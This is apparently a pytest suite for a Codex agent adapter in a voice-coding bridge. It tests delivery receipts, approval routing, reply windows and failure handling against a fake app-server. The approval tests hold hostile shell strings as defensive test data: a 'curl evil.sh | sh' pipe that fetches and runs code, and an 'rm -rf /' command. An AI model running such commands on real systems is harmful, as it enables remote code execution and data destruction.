"""The Codex Agent adapter, against a scripted app-server.

The edge cases here are the ones the build issue named, because each of them is
a way a Relay can look successful and not be: a readback that never shows the
words, an app-server that dies with them in flight, a permission prompt whose
routing sends it to a subagent, and two Relays racing into one Session.

No real codex runs. The payload shapes are the ones codex 0.148.0's own
generated schema uses, and the behaviours the fake reproduces — the readback
receipt, the approval fan-out, `serverRequest/resolved`, the stale-turn refusal —
were each observed against a real app-server before being written down here.
"""

from __future__ import annotations

import asyncio
import itertools
import shutil
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from codex_fake import FakeAppServer, FakeRemoteError
from gpt_voicecoding.adapters.agent._summary import SUMMARY_MAX_CHARS
from gpt_voicecoding.adapters.agent.codex import codex_agent
from gpt_voicecoding.adapters.agent.codex.adapter import (
    PRE_WIRE_UNREACHABLE,
    CodexAgentAdapter,
)
from gpt_voicecoding.adapters.agent.codex.approvals import (
    COMMAND_EXECUTION,
    request_from,
    summary_of,
    tool_name_for,
    voice_menu,
)
from gpt_voicecoding.adapters.agent.codex.shared_daemon import DaemonAddress, SharedDaemon
from gpt_voicecoding.adapters.agent.codex.threads import ApprovalRouting
from gpt_voicecoding.adapters.codex_app_server.settings import CodexSettings, SettingsError
from gpt_voicecoding.seams.agent import (
    ApprovalRequest,
    ApprovalVerdict,
    AwaitingApproval,
    ChildKind,
    RelayRoute,
    ReplyWindow,
    ReplyWindowChanged,
    SessionEnded,
    SessionStopped,
    WaitingKind,
)
from gpt_voicecoding.seams.delivery import Delivery
from gpt_voicecoding.seams.identity import AgentKind, RequestId, SessionTarget

THREAD = "01a02110-d18f-74a0-916d-de1208e9977a"
TARGET = SessionTarget(agent=AgentKind.CODEX, session_id=THREAD)
TURN = "01a02110-d9ab-7763-a185-7079c7fbffe0"
APPROVAL = "item/commandExecution/requestApproval"

_names = itertools.count()


class Sink:
    """The event sink, recording what the adapter raised upward."""

    def __init__(self) -> None:
        self.events: list[Any] = []

    def emit(self, event: Any) -> None:
        self.events.append(event)

    def of(self, kind: type) -> list[Any]:
        return [event for event in self.events if isinstance(event, kind)]


class Codex(FakeAppServer):
    """A fake app-server scripted to behave like one holding a live thread."""

    def script(
        self,
        *,
        thread_id: str = THREAD,
        approval_policy: str = "on-request",
        reviewer: str = "user",
        status: str = "idle",
    ) -> Codex:
        self.delivered: list[str] = []
        self.thread_id = thread_id
        self.reviewer = reviewer
        self.approval_policy = approval_policy
        self.status = status
        #: When False, `turn/start` records the words but the readback never
        #: shows them — the "no proof either way" case.
        self.readback_shows_words = True
        #: How many copies the readback claims. More than one contradicts.
        self.readback_copies = 1
        #: Whether `turn/start`'s approval override actually takes effect.
        self.honours_the_pin = True
        #: What the daemon says started this thread. `None` is what a daemon too
        #: old to record one says, and is the ordinary case (#112).
        self.thread_source: str | None = None

        self.answers("initialize", {})
        self.answers(
            "thread/resume",
            lambda _p: {
                "thread": {"id": self.thread_id, "status": {"type": self.status}},
                "approvalPolicy": self.approval_policy,
                "approvalsReviewer": self.reviewer,
            },
        )
        self.answers("turn/start", self._turn_start)
        self.answers("turn/steer", self._turn_steer)
        self.answers("thread/read", self._thread_read)
        self.answers("thread/loaded/list", {"data": [thread_id]})
        return self

    def _turn_start(self, params: dict) -> dict:
        # A real server applies the turn's approval overrides to the thread —
        # unless `honours_the_pin` is off, which is the case that matters: the
        # request succeeds, the override is silently dropped, and only the
        # readback can tell. A fake that always applied it could never fail.
        if self.honours_the_pin:
            if params.get("approvalsReviewer"):
                self.reviewer = params["approvalsReviewer"]
            if params.get("approvalPolicy"):
                self.approval_policy = params["approvalPolicy"]
        self.delivered.append(params["clientUserMessageId"])
        return {"turn": {"id": TURN, "status": "inProgress"}}

    def _turn_steer(self, params: dict) -> dict:
        if params["expectedTurnId"] != TURN:
            raise FakeRemoteError(
                f"expected active turn id `{params['expectedTurnId']}` but found `{TURN}`"
            )
        self.delivered.append(params["clientUserMessageId"])
        return {"turnId": TURN}

    def _thread_read(self, _params: dict) -> dict:
        items = []
        if self.readback_shows_words:
            for landed in self.delivered:
                items.extend([{"type": "userMessage", "clientId": landed}] * self.readback_copies)
        thread: dict[str, Any] = {"id": self.thread_id, "turns": [{"items": items}]}
        if self.thread_source is not None:
            thread["threadSource"] = self.thread_source
        return {"thread": thread}


@pytest.fixture
def socket_path() -> Iterator[Path]:
    """A private directory, under a root short enough to bind.

    Darwin caps an ``AF_UNIX`` path at 103 bytes, so it cannot live under
    pytest's ``tmp_path``; and it needs a directory only this user can enter,
    because the adapter refuses to speak to a socket sitting anywhere every
    account on the machine could swap it out from under the check.
    """
    home = Path("/tmp") / f"vc-agent-{next(_names)}-{id(object())}"
    home.mkdir(mode=0o700)
    yield home / "app-server.sock"
    shutil.rmtree(home, ignore_errors=True)


def no_daemon() -> SharedDaemon:
    """A shared daemon that is honestly not there.

    Every test in this module drives a *scripted* app-server, so none of them
    wants the machine's real daemon — and since #77 the Relay and Approval verbs
    reach for one when they hold no thread. `conftest` refuses the real lookup
    loudly; this is the honest answer to put in its place, and it is also the
    pre-wire `FAILED` case in its own right.
    """

    async def not_running(_executable: str) -> tuple[None, str]:
        return None, "the shared Codex daemon is not answering: no daemon is running"

    return SharedDaemon(settings=CodexSettings(), version="test", locate=not_running)


def quick(**overrides: Any) -> CodexSettings:
    """Settings whose waits are short enough for a test to actually spend them."""
    return CodexSettings(
        receipt_timeout_seconds=0.3,
        receipt_poll_seconds=0.01,
        verdict_timeout_seconds=0.3,
        request_timeout_seconds=2.0,
        **overrides,
    )


async def watching(server: Codex, sink: Sink, settings: CodexSettings | None = None):
    """An adapter already attached to one scripted Session."""
    adapter = CodexAgentAdapter(sink=sink, settings=settings or quick(), daemon=no_daemon())
    await adapter.register_session(TARGET, server.path)
    return adapter


def rid(text: str = "r-1") -> RequestId:
    return RequestId(text)


class TestRegisteringSessions:
    def test_a_registered_session_channel_is_recorded(self, socket_path: Path, caplog) -> None:
        caplog.set_level("INFO", logger="gpt_voicecoding.adapters.agent.codex.adapter")

        async def scenario() -> Path:
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    return server.path
                finally:
                    await adapter.aclose()

        registered_path = asyncio.run(scenario())
        assert [record.getMessage() for record in caplog.records] == [
            "registered Session channel "
            f"agent=codex session_id={THREAD} pid=None socket={registered_path}"
        ]


class TestCarryingTheUsersWords:
    def test_a_relay_is_delivered_only_once_the_thread_shows_the_words(
        self, socket_path: Path
    ) -> None:
        """A successful `turn/start` is not proof; the readback is."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    receipt = await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                    return receipt, server.calls_to("turn/start")
                finally:
                    await adapter.aclose()

        receipt, starts = asyncio.run(scenario())
        assert receipt.outcome is Delivery.DELIVERED
        assert starts[0]["clientUserMessageId"] == "r-1"
        assert starts[0]["input"] == [{"type": "text", "text": "ship it"}]
        assert starts[0]["threadId"] == THREAD

    def test_every_turn_asserts_where_approvals_go(self, socket_path: Path) -> None:
        """The pin cannot be set at resume time, so it rides every turn instead."""

        async def scenario():
            async with Codex(socket_path).script(
                approval_policy="never", reviewer="auto_review"
            ) as server:
                adapter = await watching(server, Sink())
                try:
                    await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                    return server.calls_to("turn/start")[0], server.reviewer
                finally:
                    await adapter.aclose()

        started, reviewer = asyncio.run(scenario())
        assert started["approvalsReviewer"] == "user"
        assert started["approvalPolicy"] == "on-request"
        assert reviewer == "user"

    def test_a_readback_that_never_shows_the_words_is_unknown_not_delivered(
        self, socket_path: Path
    ) -> None:
        """The case the build issue names first: no proof either way is UNKNOWN."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                server.readback_shows_words = False
                adapter = await watching(server, Sink())
                try:
                    return await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.UNKNOWN
        assert "never showed the words" in receipt.reason

    def test_a_readback_holding_two_copies_contradicts_and_is_unknown(
        self, socket_path: Path
    ) -> None:
        """A contradiction is UNKNOWN, never FAILED: the words may well be in there."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                server.readback_copies = 2
                adapter = await watching(server, Sink())
                try:
                    return await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.UNKNOWN
        assert "contradicted" in receipt.reason

    def test_a_refused_turn_never_reached_the_thread_so_it_failed(self, socket_path: Path) -> None:
        """A rejected request started no turn, so the words provably did not land."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                server.answers(
                    "turn/start",
                    lambda _p: (_ for _ in ()).throw(FakeRemoteError("thread is archived")),
                )
                adapter = await watching(server, Sink())
                try:
                    return await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert "thread is archived" in receipt.reason

    def test_two_rapid_relays_reach_the_session_in_the_order_they_were_made(
        self, socket_path: Path
    ) -> None:
        """One Session, two Relays, no interleaving and no lost id."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    first, second = await asyncio.gather(
                        adapter.answer_relay(TARGET, "one", request_id=rid("r-1")),
                        adapter.answer_relay(TARGET, "two", request_id=rid("r-2")),
                    )
                    return (
                        [first.outcome, second.outcome],
                        [call["clientUserMessageId"] for call in server.calls_to("turn/start")],
                        [call["input"][0]["text"] for call in server.calls_to("turn/start")],
                    )
                finally:
                    await adapter.aclose()

        outcomes, ids, texts = asyncio.run(scenario())
        assert outcomes == [Delivery.DELIVERED, Delivery.DELIVERED]
        assert ids == ["r-1", "r-2"]
        assert texts == ["one", "two"]

    def test_a_session_with_no_shared_daemon_fails_before_the_wire(self, socket_path: Path) -> None:
        """The pre-wire refusal (#83's advisor note): nothing was sent, so FAILED.

        `FAILED` rather than `UNKNOWN` is the whole point. Nothing left this
        process, so non-delivery is *proven* — which is what lets Bridge Core try
        again at the next Reply Window instead of holding the words as a
        duplicate risk forever (P9).
        """

        async def scenario():
            adapter = CodexAgentAdapter(sink=Sink(), settings=quick(), daemon=no_daemon())
            return await adapter.answer_relay(TARGET, "ship it", request_id=rid())

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert PRE_WIRE_UNREACHABLE in receipt.reason
        assert "no daemon is running" in receipt.reason

    def test_that_refusal_names_the_daemons_own_reason(self, socket_path: Path) -> None:
        """ "The daemon is down" and "`codex` is not installed" send you elsewhere."""

        async def scenario():
            async def missing(_executable: str) -> tuple[None, str]:
                return None, "codex could not be run: No such file or directory"

            adapter = CodexAgentAdapter(
                sink=Sink(),
                settings=quick(),
                daemon=SharedDaemon(settings=CodexSettings(), version="t", locate=missing),
            )
            return await adapter.answer_relay(TARGET, "ship it", request_id=rid())

        assert "No such file or directory" in asyncio.run(scenario()).reason

    def test_a_verdict_with_no_shared_daemon_fails_before_the_wire_too(
        self, socket_path: Path
    ) -> None:
        async def scenario():
            adapter = CodexAgentAdapter(sink=Sink(), settings=quick(), daemon=no_daemon())
            return await adapter.approval_relay(
                ApprovalRequest(approval_id="a1", target=TARGET, tool_name="a shell command"),
                ApprovalVerdict.ALLOW,
                request_id=rid(),
            )

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert PRE_WIRE_UNREACHABLE in receipt.reason

    def test_a_tui_that_has_taken_no_turn_yet_says_so(self) -> None:
        """#73: a Codex Session gains its thread id at its first turn."""

        async def scenario():
            adapter = CodexAgentAdapter(sink=Sink(), settings=quick(), daemon=no_daemon())
            return await adapter.answer_relay(
                SessionTarget(agent=AgentKind.CODEX, pid=4321),
                "ship it",
                request_id=rid(),
            )

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert "has not started a thread yet" in receipt.reason


class TestSupplement:
    def test_both_routes_are_offered_because_steer_is_stable(self) -> None:
        adapter = CodexAgentAdapter()
        assert adapter.supported_routes() == frozenset({RelayRoute.DELIVER, RelayRoute.SUPPLEMENT})

    def test_a_supplement_goes_into_the_running_turn(self, socket_path: Path) -> None:
        async def scenario():
            async with Codex(socket_path).script(status="active") as server:
                adapter = await watching(server, Sink())
                try:
                    await server.notify_all(
                        "turn/started", {"threadId": THREAD, "turn": {"id": TURN}}
                    )
                    await _settled()
                    receipt = await adapter.answer_relay(
                        TARGET,
                        "also fix the tests",
                        request_id=rid(),
                        route=RelayRoute.SUPPLEMENT,
                    )
                    return receipt, server.calls_to("turn/steer")
                finally:
                    await adapter.aclose()

        receipt, steers = asyncio.run(scenario())
        assert receipt.outcome is Delivery.DELIVERED
        assert steers[0]["expectedTurnId"] == TURN
        assert steers[0]["clientUserMessageId"] == "r-1"
        assert steers[0]["input"] == [{"type": "text", "text": "also fix the tests"}]

    def test_a_supplement_with_no_running_turn_fails_and_says_so(self, socket_path: Path) -> None:
        """What to do instead is Bridge Core's policy, so the adapter only reports."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    return await adapter.answer_relay(
                        TARGET, "now", request_id=rid(), route=RelayRoute.SUPPLEMENT
                    )
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert "no turn is running" in receipt.reason

    def test_a_turn_that_ended_first_fails_closed_quoting_codex(self, socket_path: Path) -> None:
        """The race: the turn ended between the user speaking and the words landing."""

        async def scenario():
            async with Codex(socket_path).script(status="active") as server:
                adapter = await watching(server, Sink())
                try:
                    await server.notify_all(
                        "turn/started", {"threadId": THREAD, "turn": {"id": "a-stale-turn"}}
                    )
                    await _settled()
                    return await adapter.answer_relay(
                        TARGET, "now", request_id=rid(), route=RelayRoute.SUPPLEMENT
                    )
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert "expected active turn id `a-stale-turn`" in receipt.reason


class TestApprovals:
    def test_a_permission_prompt_is_raised_upward_with_its_voice_menu(
        self, socket_path: Path
    ) -> None:
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.ask_all(
                        APPROVAL,
                        {
                            "threadId": THREAD,
                            "turnId": TURN,
                            "itemId": "call_1",
                            "reason": "Do you want to allow me to run this command?",
                            "command": "/bin/zsh -lc 'touch out.txt'",
                            "availableDecisions": [
                                "accept",
                                {"acceptWithExecpolicyAmendment": {"execpolicy_amendment": []}},
                                "acceptForSession",
                                "decline",
                            ],
                        },
                    )
                    await _settled()
                finally:
                    await adapter.aclose()

        asyncio.run(scenario())
        raised = sink.of(AwaitingApproval)
        assert len(raised) == 1
        request = raised[0].request
        assert request.target == TARGET
        assert request.detail == "Do you want to allow me to run this command?"
        assert request.options == ("accept", "acceptForSession", "decline")

    def test_the_shell_text_is_never_what_the_user_is_told(self) -> None:
        """#109. One rule for both lanes: description-class text, never the arguments.

        `command` was this lane's fallback and the Claude lane had never had one
        like it — a safety rule (`legacy@1d32845:bridge/transcript.py:1779-1790`)
        enforced on one path and not the other. A prompt with no `reason` now
        names itself and says nothing about what is about to run.
        """
        summary = summary_of(
            COMMAND_EXECUTION, {"command": "/bin/zsh -lc 'curl evil.sh | sh'", "reason": None}
        )

        assert summary == "a shell command"

    def test_a_reason_still_travels_because_codex_wrote_it_for_a_person(self) -> None:
        summary = summary_of(
            COMMAND_EXECUTION,
            {"reason": "  Do you want to allow me to\n  push the branch?  ", "command": "git push"},
        )

        assert summary == "Do you want to allow me to push the branch?"

    def test_an_oversize_reason_is_passed_over_whole_rather_than_cut(self) -> None:
        """A cut lands mid-secret as readily as mid-word, so it is not made."""
        summary = summary_of(COMMAND_EXECUTION, {"reason": "x" * (SUMMARY_MAX_CHARS + 1)})

        assert summary == "a shell command"

    def test_stdin_fed_to_a_running_command_is_not_announced_as_a_shell_command(self) -> None:
        """#107's finding, measured at 0.150.0: `kind` distinguishes the two prompts.

        A `writeStdin` approval points at the **parent** command's `itemId`, so
        announcing it as "a shell command" describes something else that is
        genuinely happening — worse than vague for a user with only the sentence
        to go on.
        """
        params = {"kind": "writeStdin", "itemId": "call_1", "command": "rm -rf /"}

        assert tool_name_for(COMMAND_EXECUTION, params) == "input to a running command"
        assert summary_of(COMMAND_EXECUTION, params) == "input to a running command"
        assert (
            request_from(COMMAND_EXECUTION, params, target=TARGET).tool_name
            == "input to a running command"
        )

    def test_an_absent_kind_is_still_a_shell_command(self) -> None:
        """0.149.1 sends no `kind` at all; 0.150.0 defaults it to `command`."""
        assert tool_name_for(COMMAND_EXECUTION, {"itemId": "call_1"}) == "a shell command"
        assert tool_name_for(COMMAND_EXECUTION, {"kind": "command"}) == "a shell command"

    def test_the_voice_menu_never_offers_a_grant_that_outlives_the_session(self) -> None:
        """The ceiling is `acceptForSession`; a persistent rule is not offerable."""
        offered = voice_menu(
            [
                "accept",
                {"acceptWithExecpolicyAmendment": {"execpolicy_amendment": ["touch"]}},
                "acceptAlways",
                "acceptForSession",
                "decline",
            ]
        )
        assert offered == ("accept", "acceptForSession", "decline")

    def test_allow_answers_the_prompt_and_is_delivered_once_codex_confirms(
        self, socket_path: Path
    ) -> None:
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    wire_id = await server.ask_all(
                        APPROVAL, {"threadId": THREAD, "turnId": TURN, "itemId": "call_1"}
                    )
                    await _settled()
                    request = sink.of(AwaitingApproval)[0].request
                    verdict = asyncio.ensure_future(
                        adapter.approval_relay(
                            request, ApprovalVerdict.ALLOW, request_id=rid("v-1")
                        )
                    )
                    await _until(lambda: server.answered(wire_id))
                    await server.notify_all(
                        "serverRequest/resolved", {"threadId": THREAD, "requestId": wire_id}
                    )
                    return await verdict
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.DELIVERED

    def test_ask_answers_nothing_at_all_and_is_held(self, socket_path: Path) -> None:
        """A budget expiry must never become a denial, so `ask` is silence."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    wire_id = await server.ask_all(
                        APPROVAL, {"threadId": THREAD, "turnId": TURN, "itemId": "call_1"}
                    )
                    await _settled()
                    request = sink.of(AwaitingApproval)[0].request
                    receipt = await adapter.approval_relay(
                        request, ApprovalVerdict.ASK, request_id=rid("v-1")
                    )
                    await _settled()
                    return receipt, server.answered(wire_id)
                finally:
                    await adapter.aclose()

        receipt, answered = asyncio.run(scenario())
        assert receipt.outcome is Delivery.HELD
        assert answered is False

    def test_a_verdict_the_on_screen_dialog_already_answered_is_refused(
        self, socket_path: Path
    ) -> None:
        """The prompt fans out, so the dialog may get there first. Never answer twice."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    wire_id = await server.ask_all(
                        APPROVAL, {"threadId": THREAD, "turnId": TURN, "itemId": "call_1"}
                    )
                    await _settled()
                    request = sink.of(AwaitingApproval)[0].request
                    await server.notify_all(
                        "serverRequest/resolved", {"threadId": THREAD, "requestId": wire_id}
                    )
                    await _settled()
                    return await adapter.approval_relay(
                        request, ApprovalVerdict.ALLOW, request_id=rid("v-1")
                    )
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert "already" in receipt.reason


class TestApprovalRouting:
    def test_a_thread_nobody_has_pinned_is_unpinned_not_misrouted(self, socket_path: Path) -> None:
        """Never spoken to is a different fact from provably mis-routed."""

        async def scenario():
            async with Codex(socket_path).script(
                approval_policy="never", reviewer="auto_review"
            ) as server:
                adapter = await watching(server, Sink())
                try:
                    return adapter._threads[TARGET].routing
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()) is ApprovalRouting.UNPINNED

    def test_a_readback_disagreeing_after_we_pinned_refuses_the_next_relay(
        self, socket_path: Path
    ) -> None:
        """The words that arrived are still DELIVERED; the next Relay fails pre-wire."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    first = await adapter.answer_relay(TARGET, "one", request_id=rid("r-1"))
                    await server.notify_all(
                        "thread/settings/updated",
                        {
                            "threadId": THREAD,
                            "threadSettings": {
                                "approvalPolicy": "never",
                                "approvalsReviewer": "auto_review",
                            },
                        },
                    )
                    await _settled()
                    second = await adapter.answer_relay(TARGET, "two", request_id=rid("r-2"))
                    return first, second, server.calls_to("turn/start")
                finally:
                    await adapter.aclose()

        first, second, starts = asyncio.run(scenario())
        assert first.outcome is Delivery.DELIVERED
        assert second.outcome is Delivery.FAILED
        assert "routed away from the user" in second.reason
        assert "auto_review" in second.reason
        # Nothing of the refused Relay ever went on the wire.
        assert [call["clientUserMessageId"] for call in starts] == ["r-1"]

    def test_a_misrouted_session_refuses_a_verdict_too(self, socket_path: Path) -> None:
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.ask_all(
                        APPROVAL, {"threadId": THREAD, "turnId": TURN, "itemId": "call_1"}
                    )
                    await _settled()
                    request = sink.of(AwaitingApproval)[0].request
                    await adapter.answer_relay(TARGET, "one", request_id=rid("r-1"))
                    await server.notify_all(
                        "thread/settings/updated",
                        {
                            "threadId": THREAD,
                            "threadSettings": {
                                "approvalPolicy": "on-request",
                                "approvalsReviewer": "guardian_subagent",
                            },
                        },
                    )
                    await _settled()
                    return await adapter.approval_relay(
                        request, ApprovalVerdict.ALLOW, request_id=rid("v-1")
                    )
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert "guardian_subagent" in receipt.reason


class TestTheLevelItIsAskedFor:
    """The Agent seam's `reply_window`, which is how a Session's starting level lands (#27).

    Codex has the same registration ordering Claude does, and the same
    consequence. `register_session` awaits `_subscribe`, whose `thread/resume`
    echo carries the thread's status, so `_note_status` fires and latches
    `observed` before Bridge Core holds the Session — putting that first report
    exactly where it gets dropped as unknown. Bridge Core therefore asks instead
    of listening, and what it must be told is whatever this adapter has actually
    observed.
    """

    def _asked(self, socket_path: Path, *, status: str) -> tuple[ReplyWindow, ReplyWindow]:
        """The level the seam is told, alongside the level the adapter holds."""

        async def scenario() -> tuple[ReplyWindow, ReplyWindow]:
            async with Codex(socket_path).script(status=status) as server:
                adapter = await watching(server, Sink())
                try:
                    return adapter.reply_window(TARGET), adapter._threads[TARGET].reply_window
                finally:
                    await adapter.aclose()

        return asyncio.run(scenario())

    def test_an_idle_thread_answers_open_with_what_it_observed(self, socket_path: Path) -> None:
        """The case the drop costs: a Session idle at registration, told to nobody."""
        asked, held = self._asked(socket_path, status="idle")

        assert asked is ReplyWindow.OPEN
        assert asked is held

    def test_an_active_thread_answers_closed_with_what_it_observed(self, socket_path: Path) -> None:
        asked, held = self._asked(socket_path, status="active")

        assert asked is ReplyWindow.CLOSED
        assert asked is held

    def test_a_thread_that_has_reported_no_status_answers_closed(self, socket_path: Path) -> None:
        """Fail closed, and provisionally so.

        A status kind this build does not recognise leaves `observed` False, so
        nothing has been observed at all. CLOSED is the only honest answer — a
        window nobody has seen is not one anything may claim is open — and it is
        provisional rather than wrong, because the first status that does arrive
        is emitted as a transition and corrects it.
        """

        async def scenario() -> tuple[ReplyWindow, bool]:
            async with Codex(socket_path).script(status="meditating") as server:
                adapter = await watching(server, Sink())
                try:
                    return adapter.reply_window(TARGET), adapter._threads[TARGET].observed
                finally:
                    await adapter.aclose()

        asked, observed = asyncio.run(scenario())

        assert asked is ReplyWindow.CLOSED
        assert observed is False

    def test_a_session_this_adapter_does_not_watch_answers_closed(self, socket_path: Path) -> None:
        """Not reachable is not the same as not busy, and neither is an open window."""

        async def scenario() -> ReplyWindow:
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    stranger = SessionTarget(agent=AgentKind.CODEX, session_id="somebody-else")
                    return adapter.reply_window(stranger)
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()) is ReplyWindow.CLOSED


class TestWhatItRaisesUpward:
    def test_a_turn_ending_closes_the_loop_as_a_stop_and_an_open_window(
        self, socket_path: Path
    ) -> None:
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script(status="idle") as server:
                adapter = await watching(server, sink)
                try:
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "active", "activeFlags": []}},
                    )
                    await _settled()
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "idle"}},
                    )
                    await _settled()
                finally:
                    await adapter.aclose()

        asyncio.run(scenario())
        # The first entry is registration reporting what the Session already is;
        # only the transitions after it are things that happened.
        assert [event.window for event in sink.of(ReplyWindowChanged)] == [
            ReplyWindow.OPEN,
            ReplyWindow.CLOSED,
            ReplyWindow.OPEN,
        ]
        assert len(sink.of(SessionStopped)) == 1

    def test_a_session_that_never_ran_is_not_announced_as_having_stopped(
        self, socket_path: Path
    ) -> None:
        """Otherwise registering a quiet Session would ring the user's phone."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script(status="idle") as server:
                adapter = await watching(server, sink)
                try:
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "idle"}},
                    )
                    await _settled()
                finally:
                    await adapter.aclose()

        asyncio.run(scenario())
        assert sink.of(SessionStopped) == []

    def test_a_closed_thread_is_reported_as_a_session_that_ended(self, socket_path: Path) -> None:
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.notify_all("thread/closed", {"threadId": THREAD})
                    await _settled()
                finally:
                    await adapter.aclose()

        asyncio.run(scenario())
        assert [event.target for event in sink.of(SessionEnded)] == [TARGET]

    def test_a_closed_thread_is_dropped_as_well_as_reported(self, socket_path: Path) -> None:
        """The Session ended, so nothing here goes on holding it (#98).

        `forget_session` had no caller on either lane. The adapter that emits
        `SessionEnded` is the one that knows, so it lets go at the emission
        site — the other emitter, `_connection_lost`, already did.
        """
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.notify_all("thread/closed", {"threadId": THREAD})
                    await _settled()
                    return adapter.watching()
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()) == ()

    def test_a_notification_about_a_thread_nobody_watches_is_ignored(
        self, socket_path: Path
    ) -> None:
        sink = Sink()

        async def scenario() -> int:
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    already = len(sink.events)
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": "some-other-thread", "status": {"type": "idle"}},
                    )
                    await _settled()
                    return len(sink.events) - already
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()) == 0


class TestWhenTheAppServerDies:
    def test_a_relay_in_flight_is_classified_and_nothing_retries_it(
        self, socket_path: Path
    ) -> None:
        """The build issue's third edge case: classified, marked, no retry storm."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:

                async def never_answers(_params: dict) -> dict:
                    await asyncio.sleep(30)
                    return {}

                server.answers("turn/start", never_answers)
                adapter = await watching(server, sink)
                try:
                    relaying = asyncio.ensure_future(
                        adapter.answer_relay(TARGET, "ship it", request_id=rid())
                    )
                    await _until(lambda: bool(server.calls_to("turn/start")))
                    await server.drop_everyone()
                    receipt = await asyncio.wait_for(relaying, 3)
                    return receipt, server.calls_to("turn/start")
                finally:
                    await adapter.aclose()

        receipt, starts = asyncio.run(scenario())
        # The words were on the wire, so nothing here may claim they did not go.
        assert receipt.outcome is Delivery.UNKNOWN
        # Classified, Session marked, and sent exactly once — no retry storm.
        assert [event.target for event in sink.of(SessionEnded)] == [TARGET]
        assert len(starts) == 1

    def test_a_relay_into_a_session_whose_socket_is_gone_never_reached_it(
        self, socket_path: Path
    ) -> None:
        """Failing before anything is sent is the one case that proves non-arrival."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, Sink())
                try:
                    await adapter._threads[TARGET].connection.aclose()
                    adapter._threads[TARGET].subscribed = False
                    return await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        # Since #77 a thread whose own app-server went away is looked for on the
        # shared daemon before anything is given up on. There is none here, so
        # the refusal is the pre-wire one — still FAILED, still nothing sent.
        assert PRE_WIRE_UNREACHABLE in receipt.reason


class TestSettings:
    def test_an_absent_table_is_every_default(self) -> None:
        assert CodexSettings.of(None) == CodexSettings()
        assert CodexSettings.of({}) == CodexSettings()

    def test_a_key_this_adapter_does_not_have_refuses_to_start(self) -> None:
        """A misspelled timeout that silently defaults is the silent fallback ban."""
        with pytest.raises(SettingsError, match="receipt_timeout_second"):
            CodexSettings.of({"receipt_timeout_second": 5})

    def test_the_refusal_names_the_keys_it_does_have(self) -> None:
        with pytest.raises(SettingsError, match="receipt_timeout_seconds"):
            CodexSettings.of({"nonsense": 1})

    def test_a_duration_that_is_not_a_number_is_refused(self) -> None:
        with pytest.raises(SettingsError, match="must be a number of seconds"):
            CodexSettings.of({"receipt_timeout_seconds": "soon"})

    def test_a_zero_duration_is_refused(self) -> None:
        with pytest.raises(SettingsError, match="positive"):
            CodexSettings.of({"receipt_timeout_seconds": 0})

    def test_paths_and_executables_are_read_as_what_they_are(self) -> None:
        settings = CodexSettings.of({"executable": "/opt/codex", "socket_directory": "~/sockets"})
        assert settings.executable == "/opt/codex"
